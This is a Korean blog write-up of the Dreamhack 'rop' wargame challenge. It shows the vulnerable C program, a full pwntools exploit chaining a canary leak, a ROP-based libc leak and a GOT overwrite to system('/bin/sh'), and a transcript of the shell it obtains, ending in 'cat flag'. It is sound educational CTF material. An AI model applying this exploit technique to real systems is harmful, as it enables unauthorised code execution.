@@ -1,0 +1,189 @@
+---
+title: "[Dreamhack] rop 문제 풀이"
+date: 2025-01-17
+tags: ["dreamhack", "system_hacking", "wargame"]
+draft: false
+summary: "요약: write로 leak하는줄 모르고 puts로 하다가 안돼서 write로 바로 풀어버린 멍충이"
+---
+
+# 문제 개요
+
+```c
+// Name: rop.c
+// Compile: gcc -o rop rop.c -fno-PIE -no-pie
+
+#include <stdio.h>
+#include <unistd.h>
+
+int main() {
+  char buf[0x30];
+
+  setvbuf(stdin, 0, _IONBF, 0);
+  setvbuf(stdout, 0, _IONBF, 0);
+
+  // Leak canary
+  puts("[1] Leak Canary");
+  write(1, "Buf: ", 5);
+  read(0, buf, 0x100);
+  printf("Buf: %s\n", buf);
+
+  // Do ROP
+  puts("[2] Input ROP payload");
+  write(1, "Buf: ", 5);
+  read(0, buf, 0x100);
+
+  return 0;
+}
+```
+
+코드는 위와 같이 되어있다. ~~겁나게 심플하네 왐마~~
+
+코드는 간단하니까 설명은 치우고 쌈@뽕하게 오래걸린 익스 작성을 알려주겠다.
+# 익스플로잇 코드 작성
+
+```python
+from pwn import *
+
+#p= remote('host1.dreamhack.games', 12697)
+p= process('./rop')
+elf = ELF('./rop')
+libc = elf.libc
+bss = 0x6010a0
+
+binsh = b'/bin/sh\x00'
+p_rdi = 0x0000000000400853 
+p_rsi = 0x0000000000400851 # pop rsi ; pop r15 ; ret
+ret = 0x0000000000400596
+write_plt = elf.plt['write']
+read_plt = elf.plt['read']
+read_got = elf.got['read']
+
+leak_canary = b'A'* (56+1) # null byte
+pause()
+p.send(leak_canary)
+p.recvuntil(leak_canary)
+canary = u64(b'\x00'+p.recv(7))
+
+payload = b'B' * 56
+payload += p64(canary)
+payload += b'C' * 8
+# chain 1. leaking read@got to using write
+payload += p64(p_rdi)
+payload += p64(1)
+payload += p64(p_rsi)
+payload += p64(read_got)
+payload += p64(0)
+payload += p64(write_plt)
+# chain 2. got overwriting
+payload += p64(p_rdi)
+payload += p64(0)
+payload += p64(p_rsi)
+payload += p64(read_got)
+payload += p64(0)
+payload += p64(read_plt)
+# chain 3. return to read_plt (got overwrited)
+payload += p64(p_rdi)
+payload += p64(read_got+0x8)
+payload += p64(ret)
+payload += p64(read_plt)
+
+p.sendafter(b"Buf: ", payload)
+
+leak = u64(p.recv(6) + b"\x00\x00")
+base = leak - libc.symbols['read']
+sys = base + libc.symbols['system']
+print('canary_leak: '+hex(canary))
+print('read_leak: '+hex(leak))
+print('base: '+hex(base))
+print('system: '+hex(sys))
+print('bss: '+hex(bss))
+
+p.send(p64(sys) + binsh)
+
+p.interactive()
+```
+
+나는 내 이끌리는대로 코드를 짜는편이라 좀 드럽다. 보는데 지장없으니 이해 부탁한다.
+
+왜이렇게 오래걸렸는지 알려주겠다.
+
+## 대환장의 시작
+
+처음에 나는 1번째 체이닝을 하는 부분에 puts를 사용했다. 그러지 말았어야 한다.
+
+보면 pppr이 아니다. 왜냐하면 잘빠진 가젯이 없었다.
+
+그래서 야매로 rdi, rsi를 각각 찾아서 넣는 방법을 고수했는데...
+
+## 미친.. 가젯이 없네?
+
+어... rdx용 가젯이 없었다. 미친.
+
+그래서 처음에 puts를 썼을때 계속 rdx가 0x1이 되어서 오래걸렸다.
+
+## 드디어 찾은 해결책
+
+오래간만에 심심해서 키보드에 손을 올리고 rop를 풀기 시작했다.
+
+이런 맙소사, write가 있네?
+
+이걸 써보기로 한다. 드디어 원시인이 불을 발견한 것이다. ~~거지같은, 왜 이제서야...~~
+
+HOLY.. 로컬 익스가 된다.
+
+이때 혼자서 방에서 별걸 다했다. 춤추고 난리였지.. ㅎㅎ
+
+> 이제 익스를 해보자.
+
+# 익스플로잇!!
+
+```bash
+zerocoke@1eeeb91477a2:~/dh/rop$ python3 ex.py 
+[+] Opening connection to host1.dreamhack.games on port 23339: Done
+[*] '/home/zerocoke/dh/rop/rop'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        No PIE (0x400000)
+    Stripped:   No
+[*] '/home/zerocoke/dh/rop/libc.so.6'
+    Arch:       amd64-64-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    SHSTK:      Enabled
+    IBT:        Enabled
+[*] Paused (press any to continue)
+canary_leak: 0x5ccd8ea14e9f7400
+read_leak: 0x7fcb747c6980
+base: 0x7fcb746b2000
+system: 0x7fcb74702d60
+bss: 0x6010a0
+[*] Switching to interactive mode
+\x00\x00p6st\xcb\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80ǌt\xcb\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\xba\x8ct\xcb\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$                                                                                                     l                                                                                                                                                         ls                                                                                                                                                        ls
+flag
+rop
+run.sh
+$ ls
+flag
+rop
+run.sh
+$ ls
+flag
+rop
+run.sh
+$ cat flag
+DH{......}
+[*] Got EOF while reading in interactive
+```
+# 느낀점 또는 발전한 점
+
+아니 괜히 시간버린 느낌이야..
+
+허탈하다...
+
+아니야.. 이번껄로 puts는 RDX를 바꾸고 write는 RDX를 안바꾼다는걸 알았으니까 됐다.
+
+이거 올리는데까지 너무 오래걸렸어.. 요즘 너무 게을러진거 같아...
